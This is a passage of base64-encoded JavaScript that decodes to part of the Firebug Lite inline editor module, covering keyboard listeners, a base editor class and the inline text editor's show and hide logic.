mx1ciIsIHRoaXMub25CbHVyKTsNCg0KICAgICAgICB2YXIgY2hyb21lID0gRmlyZWJ1Zy5jaHJvbWU7DQoNCiAgICAgICAgdGhpcy5saXN0ZW5lcnMgPSBbDQogICAgICAgICAgICBjaHJvbWUua2V5Q29kZUxpc3RlbigiRVNDQVBFIiwgbnVsbCwgYmluZCh0aGlzLmNhbmNlbEVkaXRpbmcsIHRoaXMpKQ0KICAgICAgICBdOw0KDQogICAgICAgIGlmIChlZGl0b3IuYXJyb3dDb21wbGV0aW9uKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLmxpc3RlbmVycy5wdXNoKA0KICAgICAgICAgICAgICAgIGNocm9tZS5rZXlDb2RlTGlzdGVuKCJVUCIsIG51bGwsIGJpbmRGaXhlZChlZGl0b3IuY29tcGxldGVWYWx1ZSwgZWRpdG9yLCAtMSkpLA0KICAgICAgICAgICAgICAgIGNocm9tZS5rZXlDb2RlTGlzdGVuKCJET1dOIiwgbnVsbCwgYmluZEZpeGVkKGVkaXRvci5jb21wbGV0ZVZhbHVlLCBlZGl0b3IsIDEpKSwNCiAgICAgICAgICAgICAgICBjaHJvbWUua2V5Q29kZUxpc3RlbigiUEFHRV9VUCIsIG51bGwsIGJpbmRGaXhlZChlZGl0b3IuY29tcGxldGVWYWx1ZSwgZWRpdG9yLCAtcGFnZUFtb3VudCkpLA0KICAgICAgICAgICAgICAgIGNocm9tZS5rZXlDb2RlTGlzdGVuKCJQQUdFX0RPV04iLCBudWxsLCBiaW5kRml4ZWQoZWRpdG9yLmNvbXBsZXRlVmFsdWUsIGVkaXRvciwgcGFnZUFtb3VudCkpDQogICAgICAgICAgICApOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKGN1cnJlbnRFZGl0b3IudGFiTmF2aWdhdGlvbikNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5saXN0ZW5lcnMucHVzaCgNCiAgICAgICAgICAgICAgICBjaHJvbWUua2V5Q29kZUxpc3RlbigiUkVUVVJOIiwgbnVsbCwgYmluZCh0aGlzLnRhYk5leHRFZGl0b3IsIHRoaXMpKSwNCiAgICAgICAgICAgICAgICBjaHJvbWUua2V5Q29kZUxpc3RlbigiUkVUVVJOIiwgaXNDb250cm9sLCBiaW5kKHRoaXMuaW5zZXJ0Um93LCB0aGlzLCBudWxsLCAiYWZ0ZXIiKSksDQogICAgICAgICAgICAgICAgY2hyb21lLmtleUNvZGVMaXN0ZW4oIlRBQiIsIG51bGwsIGJpbmQodGhpcy50YWJOZXh0RWRpdG9yLCB0aGlzKSksDQogICAgICAgICAgICAgICAgY2hyb21lLmtleUNvZGVMaXN0ZW4oIlRBQiIsIGlzU2hpZnQsIGJpbmQodGhpcy50YWJQcmV2aW91c0VkaXRvciwgdGhpcykpDQogICAgICAgICAgICApOw0KICAgICAgICB9DQogICAgICAgIGVsc2UgaWYgKGN1cnJlbnRFZGl0b3IubXVsdGlMaW5lKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLmxpc3RlbmVycy5wdXNoKA0KICAgICAgICAgICAgICAgIGNocm9tZS5rZXlDb2RlTGlzdGVuKCJUQUIiLCBudWxsLCBpbnNlcnRUYWIpDQogICAgICAgICAgICApOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5saXN0ZW5lcnMucHVzaCgNCiAgICAgICAgICAgICAgICBjaHJvbWUua2V5Q29kZUxpc3RlbigiUkVUVVJOIiwgbnVsbCwgYmluZEZpeGVkKHRoaXMuc3RvcEVkaXRpbmcsIHRoaXMpKQ0KICAgICAgICAgICAgKTsNCg0KICAgICAgICAgICAgaWYgKGN1cnJlbnRFZGl0b3IudGFiQ29tcGxldGlvbikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB0aGlzLmxpc3RlbmVycy5wdXNoKA0KICAgICAgICAgICAgICAgICAgICBjaHJvbWUua2V5Q29kZUxpc3RlbigiVEFCIiwgbnVsbCwgYmluZChlZGl0b3IuY29tcGxldGVWYWx1ZSwgZWRpdG9yLCAxKSksDQogICAgICAgICAgICAgICAgICAgIGNocm9tZS5rZXlDb2RlTGlzdGVuKCJUQUIiLCBpc1NoaWZ0LCBiaW5kKGVkaXRvci5jb21wbGV0ZVZhbHVlLCBlZGl0b3IsIC0xKSkNCiAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfSwNCg0KICAgIGRldGFjaExpc3RlbmVyczogZnVuY3Rpb24oZWRpdG9yLCBjb250ZXh0KQ0KICAgIHsNCiAgICAgICAgaWYgKCF0aGlzLmxpc3RlbmVycykNCiAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICB2YXIgd2luID0gaXNJRSA/DQogICAgICAgICAgICAgICAgY3VycmVudFRhcmdldC5vd25lckRvY3VtZW50LnBhcmVudFdpbmRvdyA6DQogICAgICAgICAgICAgICAgY3VycmVudFRhcmdldC5vd25lckRvY3VtZW50LmRlZmF1bHRWaWV3Ow0KICAgICAgICANCiAgICAgICAgcmVtb3ZlRXZlbnQod2luLCAicmVzaXplIiwgdGhpcy5vblJlc2l6ZSk7DQogICAgICAgIHJlbW92ZUV2ZW50KHdpbiwgImJsdXIiLCB0aGlzLm9uQmx1cik7DQoNCiAgICAgICAgdmFyIGNocm9tZSA9IEZpcmVidWcuY2hyb21lOw0KICAgICAgICBpZiAoY2hyb21lKQ0KICAgICAgICB7DQogICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IHRoaXMubGlzdGVuZXJzLmxlbmd0aDsgKytpKQ0KICAgICAgICAgICAgICAgIGNocm9tZS5rZXlJZ25vcmUodGhpcy5saXN0ZW5lcnNbaV0pOw0KICAgICAgICB9DQoNCiAgICAgICAgZGVsZXRlIHRoaXMubGlzdGVuZXJzOw0KICAgIH0sDQoNCiAgICBvblJlc2l6ZTogZnVuY3Rpb24oZXZlbnQpDQogICAgew0KICAgICAgICBjdXJyZW50RWRpdG9yLmxheW91dCh0cnVlKTsNCiAgICB9LA0KDQogICAgb25CbHVyOiBmdW5jdGlvbihldmVudCkNCiAgICB7DQogICAgICAgIGlmIChjdXJyZW50RWRpdG9yLmVudGVyT25CbHVyICYmIGlzQW5jZXN0b3IoZXZlbnQudGFyZ2V0LCBjdXJyZW50RWRpdG9yLmJveCkpDQogICAgICAgICAgICB0aGlzLnN0b3BFZGl0aW5nKCk7DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBleHRlbmRzIE1vZHVsZQ0KDQogICAgaW5pdGlhbGl6ZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgRmlyZWJ1Zy5Nb2R1bGUuaW5pdGlhbGl6ZS5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KDQogICAgICAgIHRoaXMub25SZXNpemUgPSBiaW5kRml4ZWQodGhpcy5vblJlc2l6ZSwgdGhpcyk7DQogICAgICAgIHRoaXMub25CbHVyID0gYmluZCh0aGlzLm9uQmx1ciwgdGhpcyk7DQogICAgfSwNCg0KICAgIGRpc2FibGU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHRoaXMuc3RvcEVkaXRpbmcoKTsNCiAgICB9LA0KDQogICAgc2hvd0NvbnRleHQ6IGZ1bmN0aW9uKGJyb3dzZXIsIGNvbnRleHQpDQogICAgew0KICAgICAgICB0aGlzLnN0b3BFZGl0aW5nKCk7DQogICAgfSwNCg0KICAgIHNob3dQYW5lbDogZnVuY3Rpb24oYnJvd3NlciwgcGFuZWwpDQogICAgew0KICAgICAgICB0aGlzLnN0b3BFZGl0aW5nKCk7DQogICAgfQ0KfSk7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gQmFzZUVkaXRvcg0KDQpGaXJlYnVnLkJhc2VFZGl0b3IgPSBleHRlbmQoRmlyZWJ1Zy5NZWFzdXJlQm94LA0Kew0KICAgIGdldFZhbHVlOiBmdW5jdGlvbigpDQogICAgew0KICAgIH0sDQoNCiAgICBzZXRWYWx1ZTogZnVuY3Rpb24odmFsdWUpDQogICAgew0KICAgIH0sDQoNCiAgICBzaG93OiBmdW5jdGlvbih0YXJnZXQsIHBhbmVsLCB2YWx1ZSwgdGV4dFNpemUsIHRhcmdldFNpemUpDQogICAgew0KICAgIH0sDQoNCiAgICBoaWRlOiBmdW5jdGlvbigpDQogICAgew0KICAgIH0sDQoNCiAgICBsYXlvdXQ6IGZ1bmN0aW9uKGZvcmNlQWxsKQ0KICAgIHsNCiAgICB9LA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIC8vIFN1cHBvcnQgZm9yIGNvbnRleHQgbWVudXMgd2l0aGluIGlubGluZSBlZGl0b3JzLg0KDQogICAgZ2V0Q29udGV4dE1lbnVJdGVtczogZnVuY3Rpb24odGFyZ2V0KQ0KICAgIHsNCiAgICAgICAgdmFyIGl0ZW1zID0gW107DQogICAgICAgIGl0ZW1zLnB1c2goe2xhYmVsOiAiQ3V0IiwgY29tbWFuZElEOiAiY21kX2N1dCJ9KTsNCiAgICAgICAgaXRlbXMucHVzaCh7bGFiZWw6ICJDb3B5IiwgY29tbWFuZElEOiAiY21kX2NvcHkifSk7DQogICAgICAgIGl0ZW1zLnB1c2goe2xhYmVsOiAiUGFzdGUiLCBjb21tYW5kSUQ6ICJjbWRfcGFzdGUifSk7DQogICAgICAgIHJldHVybiBpdGVtczsNCiAgICB9LA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIC8vIEVkaXRvciBNb2R1bGUgbGlzdGVuZXJzIHdpbGwgZ2V0ICJvbkJlZ2luRWRpdGluZyIganVzdCBiZWZvcmUgdGhpcyBjYWxsDQoNCiAgICBiZWdpbkVkaXRpbmc6IGZ1bmN0aW9uKHRhcmdldCwgdmFsdWUpDQogICAgew0KICAgIH0sDQoNCiAgICAvLyBFZGl0b3IgTW9kdWxlIGxpc3RlbmVycyB3aWxsIGdldCAib25TYXZlRWRpdCIganVzdCBhZnRlciB0aGlzIGNhbGwNCiAgICBzYXZlRWRpdDogZnVuY3Rpb24odGFyZ2V0LCB2YWx1ZSwgcHJldmlvdXNWYWx1ZSkNCiAgICB7DQogICAgfSwNCg0KICAgIGVuZEVkaXRpbmc6IGZ1bmN0aW9uKHRhcmdldCwgdmFsdWUsIGNhbmNlbCkNCiAgICB7DQogICAgICAgIC8vIFJlbW92ZSBlbXB0eSBncm91cHMgYnkgZGVmYXVsdA0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9LA0KDQogICAgaW5zZXJ0TmV3Um93OiBmdW5jdGlvbih0YXJnZXQsIGluc2VydFdoZXJlKQ0KICAgIHsNCiAgICB9DQp9KTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBJbmxpbmVFZGl0b3INCg0KLy8gYmFzaWMgaW5saW5lIGVkaXRvciBhdHRyaWJ1dGVzDQp2YXIgaW5saW5lRWRpdG9yQXR0cmlidXRlcyA9IHsNCiAgICAiY2xhc3MiOiAidGV4dEVkaXRvcklubmVyIiwNCiAgICANCiAgICB0eXBlOiAidGV4dCIsIA0KICAgIHNwZWxsY2hlY2s6ICJmYWxzZSIsDQogICAgDQogICAgb25rZXlwcmVzczogIiRvbktleVByZXNzIiwNCiAgICANCiAgICBvbm92ZXJmbG93OiAiJG9uT3ZlcmZsb3ciLA0KICAgIG9uY29udGV4dG1lbnU6ICIkb25Db250ZXh0TWVudSINCn07DQoNCi8vIElFIGRvZXMgbm90IHN1cHBvcnQgdGhlIG9uaW5wdXQgZXZlbnQsIHNvIHdlJ3JlIHVzaW5nIHRoZSBvbmtleWRvd24gdG8gc2lnbmFsaXplDQovLyB0aGUgcmVsZXZhbnQga2V5Ym9hcmQgZXZlbnRzLCBhbmQgdGhlIG9ucHJvcGVydHljaGFuZ2UgdG8gYWN0dWFsbHkgaGFuZGxlIHRoZQ0KLy8gaW5wdXQgZXZlbnQsIHdoaWNoIHNob3VsZCBoYXBwZW4gYWZ0ZXIgdGhlIG9ua2V5ZG93biBldmVudCBpcyBmaXJlZCBhbmQgYWZ0ZXIgdGhlIA0KLy8gdmFsdWUgb2YgdGhlIGlucHV0IGlzIHVwZGF0ZWQsIGJ1dCBiZWZvcmUgdGhlIG9ua2V5dXAgYW5kIGJlZm9yZSB0aGUgaW5wdXQgKHdpdGggdGhlIA0KLy8gbmV3IHZhbHVlKSBpcyByZW5kZXJlZA0KaWYgKGlzSUUpDQp7DQogICAgaW5saW5lRWRpdG9yQXR0cmlidXRlcy5vbnByb3BlcnR5Y2hhbmdlID0gIiRvbklucHV0IjsNCiAgICBpbmxpbmVFZGl0b3JBdHRyaWJ1dGVzLm9ua2V5ZG93biA9ICIkb25LZXlEb3duIjsNCn0NCi8vIGZvciBvdGhlciBicm93c2VycyB3ZSB1c2UgdGhlIG9uaW5wdXQgZXZlbnQNCmVsc2UNCnsNCiAgICBpbmxpbmVFZGl0b3JBdHRyaWJ1dGVzLm9uaW5wdXQgPSAiJG9uSW5wdXQiOw0KfQ0KDQpGaXJlYnVnLklubGluZUVkaXRvciA9IGZ1bmN0aW9uKGRvYykNCnsNCiAgICB0aGlzLmluaXRpYWxpemVJbmxpbmUoZG9jKTsNCn07DQoNCkZpcmVidWcuSW5saW5lRWRpdG9yLnByb3RvdHlwZSA9IGRvbXBsYXRlKEZpcmVidWcuQmFzZUVkaXRvciwNCnsNCiAgICBlbnRlck9uQmx1cjogdHJ1ZSwNCiAgICBvdXRlck1hcmdpbjogOCwNCiAgICBzaGFkb3dFeHBhbmQ6IDcsDQoNCiAgICB0YWc6DQogICAgICAgIERJVih7ImNsYXNzIjogImlubGluZUVkaXRvciJ9LA0KICAgICAgICAgICAgRElWKHsiY2xhc3MiOiAidGV4dEVkaXRvclRvcDEifSwNCiAgICAgICAgICAgICAgICBESVYoeyJjbGFzcyI6ICJ0ZXh0RWRpdG9yVG9wMiJ9KQ0KICAgICAgICAgICAgKSwNCiAgICAgICAgICAgIERJVih7ImNsYXNzIjogInRleHRFZGl0b3JJbm5lcjEifSwNCiAgICAgICAgICAgICAgICBESVYoeyJjbGFzcyI6ICJ0ZXh0RWRpdG9ySW5uZXIyIn0sDQogICAgICAgICAgICAgICAgICAgIElOUFVUKA0KICAgICAgICAgICAgICAgICAgICAgICAgaW5saW5lRWRpdG9yQXR0cmlidXRlcw0KICAgICAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgKSwNCiAgICAgICAgICAgIERJVih7ImNsYXNzIjogInRleHRFZGl0b3JCb3R0b20xIn0sDQogICAgICAgICAgICAgICAgRElWKHsiY2xhc3MiOiAidGV4dEVkaXRvckJvdHRvbTIifSkNCiAgICAgICAgICAgICkNCiAgICAgICAgKSwNCg0KICAgIGlucHV0VGFnIDoNCiAgICAgICAgSU5QVVQoeyJjbGFzcyI6ICJ0ZXh0RWRpdG9ySW5uZXIiLCB0eXBlOiAidGV4dCIsDQogICAgICAgICAgICAvKm9uaW5wdXQ6ICIkb25JbnB1dCIsKi8gb25rZXlwcmVzczogIiRvbktleVByZXNzIiwgb25vdmVyZmxvdzogIiRvbk92ZXJmbG93In0NCiAgICAgICAgKSwNCg0KICAgIGV4cGFuZGVyVGFnOg0KICAgICAgICBJTUcoeyJjbGFzcyI6ICJpbmxpbmVFeHBhbmRlciIsIHNyYzogImJsYW5rLmdpZiJ9KSwNCg0KICAgIGluaXRpYWxpemU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHRoaXMuZml4ZWRXaWR0aCA9IGZhbHNlOw0KICAgICAgICB0aGlzLmNvbXBsZXRlQXNZb3VUeXBlID0gdHJ1ZTsNCiAgICAgICAgdGhpcy50YWJOYXZpZ2F0aW9uID0gdHJ1ZTsNCiAgICAgICAgdGhpcy5tdWx0aUxpbmUgPSBmYWxzZTsNCiAgICAgICAgdGhpcy50YWJDb21wbGV0aW9uID0gZmFsc2U7DQogICAgICAgIHRoaXMuYXJyb3dDb21wbGV0aW9uID0gdHJ1ZTsNCiAgICAgICAgdGhpcy5ub1dyYXAgPSB0cnVlOw0KICAgICAgICB0aGlzLm51bWVyaWMgPSBmYWxzZTsNCiAgICB9LA0KDQogICAgZGVzdHJveTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdGhpcy5kZXN0cm95SW5wdXQoKTsNCiAgICB9LA0KDQogICAgaW5pdGlhbGl6ZUlubGluZTogZnVuY3Rpb24oZG9jKQ0KICAgIHsNCiAgICAgICAgaWYgKEZCVHJhY2UuREJHX0VESVRPUikNCiAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJGaXJlYnVnLklubGluZUVkaXRvciBpbml0aWFsaXplSW5saW5lKCkiKTsNCiAgICAgICAgDQogICAgICAgIC8vdGhpcy5ib3ggPSB0aGlzLnRhZy5yZXBsYWNlKHt9LCBkb2MsIHRoaXMpOw0KICAgICAgICB0aGlzLmJveCA9IHRoaXMudGFnLmFwcGVuZCh7fSwgZG9jLmJvZHksIHRoaXMpOw0KICAgICAgICANCiAgICAgICAgLy90aGlzLmlucHV0ID0gdGhpcy5ib3guY2hpbGROb2Rlc1sxXS5maXJzdENoaWxkLmZpcnN0Q2hpbGQ7ICAvLyBYWFhqamIgY2hpbGROb2RlWzFdIHJlcXVpcmVkDQogICAgICAgIHRoaXMuaW5wdXQgPSB0aGlzLmJveC5nZXRFbGVtZW50c0J5VGFnTmFtZSgiaW5wdXQiKVswXTsNCiAgICAgICAgDQogICAgICAgIGlmIChpc0lFbHQ4KQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLmlucHV0LnN0eWxlLnRvcCA9ICItOHB4IjsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgdGhpcy5leHBhbmRlciA9IHRoaXMuZXhwYW5kZXJUYWcucmVwbGFjZSh7fSwgZG9jLCB0aGlzKTsNCiAgICAgICAgdGhpcy5pbml0aWFsaXplKCk7DQogICAgfSwNCg0KICAgIGRlc3Ryb3lJbnB1dDogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgLy8gWFhYam9lIE5lZWQgdG8gcmVtb3ZlIGlucHV0L2tleXByZXNzIGhhbmRsZXJzIHRvIGF2b2lkIGxlYWtzDQogICAgfSwNCg0KICAgIGdldFZhbHVlOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICByZXR1cm4gdGhpcy5pbnB1dC52YWx1ZTsNCiAgICB9LA0KDQogICAgc2V0VmFsdWU6IGZ1bmN0aW9uKHZhbHVlKQ0KICAgIHsNCiAgICAgICAgLy8gSXQncyBvbmx5IGEgb25lLWxpbmUgZWRpdG9yLCBzbyBuZXcgbGluZXMgc2hvdWxkbid0IGJlIGFsbG93ZWQNCiAgICAgICAgcmV0dXJuIHRoaXMuaW5wdXQudmFsdWUgPSBzdHJpcE5ld0xpbmVzKHZhbHVlKTsNCiAgICB9LA0KDQogICAgc2hvdzogZnVuY3Rpb24odGFyZ2V0LCBwYW5lbCwgdmFsdWUsIHRhcmdldFNpemUpDQogICAgew0KICAgICAgICAvL2Rpc3BhdGNoKFtGaXJlYnVnLkExMXlNb2RlbF0sICJvbklubGluZUVkaXRvclNob3ciLCBbcGFuZWwsIHRoaXNdKTsNCiAgICAgICAgdGhpcy50YXJnZXQgPSB0YXJnZXQ7DQogICAgICAgIHRoaXMucGFuZWwgPSBwYW5lbDsNCg0KICAgICAgICB0aGlzLnRhcmdldFNpemUgPSB0YXJnZXRTaXplOw0KICAgICAgICANCiAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gZWRpdG9yDQogICAgICAgIC8vdGhpcy50YXJnZXRPZmZzZXQgPSBnZXRDbGllbnRPZmZzZXQodGFyZ2V0KTsNCiAgICAgICAgDQogICAgICAgIC8vIFNvbWUgYnJvd3NlcnMgKElFLCBHb29nbGUgQ2hyb21lIGFuZCBTYWZhcmkpIHdpbGwgaGF2ZSBwcm9ibGVtIHRyeWluZyB0byBnZXQgdGhlIA0KICAgICAgICAvLyBvZmZzZXQgdmFsdWVzIG9mIGludmlzaWJsZSBlbGVtZW50cywgb3IgZW1wdHkgZWxlbWVudHMuIFNvLCBpbiBvcmRlciB0byBnZXQgdGhlIA0KICAgICAgICAvLyBjb3JyZWN0IHZhbHVlcywgd2UgdGVtcG9yYXJ5IGluamVjdCBhIGNoYXJhY3RlciBpbiB0aGUgaW5uZXJIVE1MIG9mIHRoZSBlbXB0eSBlbGVtZW50LCANCiAgICAgICAgLy8gdGhlbiB3ZSBnZXQgdGhlIG9mZnNldCB2YWx1ZXMsIGFuZCBuZXh0LCB3ZSByZXN0b3JlIHRoZSBvcmlnaW5hbCBpbm5lckhUTUwgdmFsdWUuDQogICAgICAgIHZhciBpbm5lckhUTUwgPSB0YXJnZXQuaW5uZXJIVE1MOw0KICAgICAgICB2YXIgaXNFbXB0eUVsZW1lbnQgPSAhaW5uZXJIVE1MOw0KICAgICAgICBpZiAoaXNFbXB0eUVsZW1lbnQpDQogICAgICAgICAgICB0YXJnZXQuaW5uZXJIVE1MID0gIi4iOw0KICAgICAgICANCiAgICAgICAgLy8gR2V0IHRoZSBwb3NpdGlvbiBvZiB0aGUgdGFyZ2V0IGVsZW1lbnQgKHRoYXQgaXMgYWJvdXQgdG8gYmUgZWRpdGVkKQ0KICAgICAgICB0aGlzLnRhcmdldE9mZnNldCA9IA0KICAgICAgICB7DQogICAgICAgICAgICB4OiB0YXJnZXQub2Zmc2V0TGVmdCwNCiAgICAgICAgICAgIHk6IHRhcmdldC5vZmZzZXRUb3ANCiAgICAgICAgfTsNCiAgICAgICAgDQogICAgICAgIC8vIFJlc3RvcmUgdGhlIG9yaWdpbmFsIGlubmVySFRNTCB2YWx1ZSBvZiB0aGUgZW1wdHkgZWxlbWVudA0KICAgICAgICBpZiAoaXNFbXB0eUVsZW1lbnQpDQogICAgICAgICAgICB0YXJnZXQuaW5uZXJIVE1MID0gaW5uZXJIVE1MOw0KICAgICAgICANCiAgICAgICAgdGhpcy5vcmlnaW5hbENsYXNzTmFtZSA9IHRoaXMuYm94LmNsYXNzTmFtZTsNCg0KICAgICAgICB2YXIgY2xhc3NOYW1lcyA9IHRhcmdldC5jbGFzc05hbWUuc3BsaXQoIiAiKTsNCiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBjbGFzc05hbWVzLmxlbmd0aDsgKytpKQ0KICAgICAgICAgICAgc2V0Q2xhc3ModGhpcy5ib3gsICJlZGl0b3ItIiArIGNsYXNzTmFtZXNbaV0pOw0KDQogICAgICAgIC8vIE1ha2UgdGhlIGVkaXRvciBtYXRjaCB0aGUgdGFyZ2V0J3MgZm9udCBzdHlsZQ0KICAgICAgICBjb3B5VGV4dFN0eWxlcyh0YXJnZXQsIHRoaXMuYm94KTsNCg0KICAgICAgICB0aGlzLnNldFZhbHVlKHZhbHVlKTsNCg0KICAgICAgICBpZiAodGhpcy5maXhlZFdpZHRoKQ0KICAgICAgICAgICAgdGhpcy51cGRhdGVMYXlvdXQodHJ1ZSk7DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5zdGFydE1lYXN1cmluZyh0YXJnZXQpOw0KICAgICAgICAgICAgdGhpcy50ZXh0U2l6ZSA9IHRoaXMubWVhc3VyZUlucHV0VGV4dCh2YWx1ZSk7DQoNCiAgICAgICAgICAgIC8vIENvcnJlY3QgdGhlIGhlaWdodCBvZiB0aGUgYm94IHRvIG1ha2UgdGhlIGZ1bmt5IENTUyBkcm9wLXNoYWRvdyBsaW5lIHVwDQogICAgICAgICAgICB2YXIgcGFyZW50ID0gdGhpcy5pbnB1dC5wYXJlbnROb2RlOw0KICAgICAgICAgICAgaWYgKGhhc0NsYXNzKHBhcmVudCwgInRleHRFZGl0b3JJbm5lcjIiKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgeURpZmYgPSB0aGlzLnRleHRTaXplLmhlaWdodCAtIHRoaXMuc2hhZG93RXhwYW5kOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIC8vIElFNiBoZWlnaHQgb2Zmc2V0DQogICAgICAgICAgICAgICAgaWYgKGlzSUU2KQ0KICAgICAgICAgICAgICAgICAgICB5RGlmZiAtPSAyOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHBhcmVudC5zdHlsZS5oZWlnaHQgPSB5RGlmZiArICJweCI7DQogICAgICAgICAgICAgICAgcGFyZW50LnBhcmVudE5vZGUuc3R5bGUuaGVpZ2h0ID0geURpZmYgKyAicHgiOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICB0aGlzLnVwZGF0ZUxheW91dCh0cnVlKTsNCiAgICAgICAgfQ0KDQogICAgICAgIHRoaXMuZ2V0QXV0b0NvbXBsZXRlcigpLnJlc2V0KCk7DQoNCiAgICAgICAgaWYgKGlzSUVsdDgpDQogICAgICAgICAgICBwYW5lbC5wYW5lbE5vZGUuYXBwZW5kQ2hpbGQodGhpcy5ib3gpOw0KICAgICAgICBlbHNlDQogICAgICAgICAgICB0YXJnZXQub2Zmc2V0UGFyZW50LmFwcGVuZENoaWxkKHRoaXMuYm94KTsgICAgICAgIA0KICAgICAgICANCiAgICAgICAgLy9jb25zb2xlLmxvZyh0YXJnZXQpOw0KICAgICAgICAvL3RoaXMuaW5wdXQuc2VsZWN0KCk7IC8vIGl0J3MgY2FsbGVkIGJlbGxvdywgd2l0aCBzZXRUaW1lb3V0DQogICAgICAgIA0KICAgICAgICBpZiAoaXNJRSkNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gcmVzZXQgaW5wdXQgc3R5bGUNCiAgICAgICAgICAgIHRoaXMuaW5wdXQuc3R5bGUuZm9udEZhbWlseSA9ICJNb25vc3BhY2UiOw0KICAgICAgICAgICAgdGhpcy5pbnB1dC5zdHlsZS5mb250U2l6ZSA9ICIxMXB4IjsNCiAgICAgICAgfQ0KDQogICAgICAgIC8vIEluc2VydCB0aGUgImV4cGFuZGVyIiB0byBjb3ZlciB0aGUgdGFyZ2V0IGVsZW1lbnQgd2l0aCB3aGl0ZSBzcGFjZQ0KICAgICAgICBpZiAoIXRoaXMuZml4ZWRXaWR0aCkNCiAgICAgICAgew0KICAgICAgICAgICAgY29weUJveFN0eWxlcyh0YXJnZXQsIHRoaXMuZXhwYW5kZXIpOw0KDQogICAgICAgICAgICB0YXJnZXQucGFyZW50Tm9kZS5yZXBsYWNlQ2hpbGQodGhpcy5leHBhbmRlciwgdGFyZ2V0KTsNCiAgICAgICAgICAgIGNvbGxhcHNlKHRhcmdldCwgdHJ1ZSk7DQogICAgICAgICAgICB0aGlzLmV4cGFuZGVyLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKHRhcmdldCwgdGhpcy5leHBhbmRlcik7DQogICAgICAgIH0NCg0KICAgICAgICAvL1RPRE86IHh4eHBlZHJvDQogICAgICAgIC8vc2Nyb2xsSW50b0NlbnRlclZpZXcodGhpcy5ib3gsIG51bGwsIHRydWUpOw0KICAgICAgICANCiAgICAgICAgLy8gRGlzcGxheSB0aGUgZWRpdG9yIGFmdGVyIGNoYW5nZSBpdHMgc2l6ZSBhbmQgcG9zaXRpb24gdG8gYXZvaWQgZmxpY2tlcmluZw0KICAgICAgICB0aGlzLmJveC5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsNCiAgICAgICAgDQogICAgICAgIC8vIHdlIG5lZWQgdG8gY2FsbCBpbnB1dC5mb2N1cygpIGFuZCBpbnB1dC5zZWxlY3QoKSB3aXRoIGEgdGltZW91dCwgDQogICAgICAgIC8vIG90aGVyd2lzZSBpdCB3b24ndCB3b3JrIG9uIGFsbCBicm93c2VycyBkdWUgdG8gdGltaW5nIGlzc3VlcyANCiAgICAgICAgdmFyIHNlbGYgPSB0aGlzOw0KICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7DQogICAgICAgICAgICBzZWxmLmlucHV0LmZvY3VzKCk7DQogICAgICAgICAgICBzZWxmLmlucHV0LnNlbGVjdCgpOw0KICAgICAgICB9LDApOw0KICAgIH0sDQoNCiAgICBoaWRlOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICB0aGlzLmJveC5jbGFzc05hbWUgPSB0aGlzLm9yaWdpbmFsQ2xhc3NOYW1lOw0KICAgICAgICANCiAgICAgICAgaWYgKCF0aGlzLmZpeGVkV2lkdGgpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRoaXMuc3RvcE1lYXN1cmluZygpOw0KDQogICAgICAgICAgICBjb2xsYXBzZSh0aGlzLnRhcmdldCwgZmFsc2UpOw0KDQogICAgICAgICAgICBpZiAodGhpcy5leHBhbmRlci5wYXJlbnROb2RlKQ0KICAgICAgICAgICAgICAgIHRoaXMuZXhwYW5kZXIucGFyZW50Tm9kZS5yZW1vdmVDaGlsZCh0aGlz